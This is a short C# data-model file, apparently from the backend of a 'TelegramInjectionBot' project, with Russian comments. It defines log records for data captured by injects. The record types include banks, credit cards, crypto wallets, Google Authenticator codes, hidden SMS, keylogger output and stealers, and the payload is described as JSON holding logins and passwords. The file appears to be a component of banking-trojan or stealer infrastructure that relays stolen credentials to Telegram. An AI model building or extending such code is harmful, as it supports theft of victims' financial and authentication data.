namespace TelegramInjectionBot.Data;

public class BotLog
{
    public ulong Id { get; set; }
    public string BotId { get; set; }

    /// <summary>
    ///     Название пакета приложения. Пример: org.app.name. Необязательный параметр
    /// </summary>
    public string Application { get; set; }

    /// <summary>
    ///     Тип лога. Доступные типы: &apos;banks&apos;, &apos;crypt&apos;, &apos;wallets&apos;, &apos;shops&apos;, &apos;
    ///     credit_cards&apos;, &apos;emails&apos;, &apos;sms&apos;, &apos;events&apos;, &apos;googleauth&apos;, &apos;hidesms
    ///     &apos;, &apos;keylogger&apos;, &apos;mail&apos;, &apos;otheraccounts&apos;, &apos;phonenumber&apos;, &apos;pushlist
    ///     &apos;, &apos;ussd&apos;, &apos;stealers&apos;
    /// </summary>
    public string Type { get; set; }

    /// <summary>
    ///     JSON массив с данными инжекта, в любом формате. {&quot;login&quot;: &quot;log&quot;, &quot;password&quot;: &quot;
    ///     pass&quot;, ...}
    /// </summary>
    public string Log { get; set; }

    public string Comment { get; set; }
    public bool TelegramAccepted { get; set; }
    public DateTime? CreatedAt { get; set; }
    public DateTime? UpdatedAt { get; set; }

    public virtual Bot Bot { get; set; }
}